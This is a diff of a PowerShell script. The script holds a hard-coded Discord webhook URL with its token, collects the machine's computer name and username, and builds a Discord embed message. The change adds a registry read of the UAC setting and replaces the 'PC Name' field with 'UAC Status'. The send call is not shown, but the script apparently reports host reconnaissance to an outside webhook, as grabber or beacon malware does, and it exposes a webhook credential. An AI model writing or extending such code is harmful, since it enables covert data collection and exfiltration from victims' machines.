@@ -1,6 +1,7 @@
 $webhookUrl = "https://discordapp.com/api/webhooks/1345713305398022257/8WDyAFlcQk-2fwOp4MW87lebVGb9a2HOcx_OYISl4eMXMeLMTjKPcZKaDj_gPBREx0P5"
 $computerName = $env:COMPUTERNAME
 $username = $env:USERNAME
+$uacStatus = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA -eq 1
 $message = @{
     embeds = @(
         @{
@@ -9,8 +10,8 @@ $message = @{
             color = 333333 # Цвет в десятичном формате
             fields = @(
                 @{
-                    name = "**PC Name**"
-                    value = $computerName
+                    name = "**UAC Status**"
+                    value = $uacStatus
                     inline = $true
                 },
                 @{
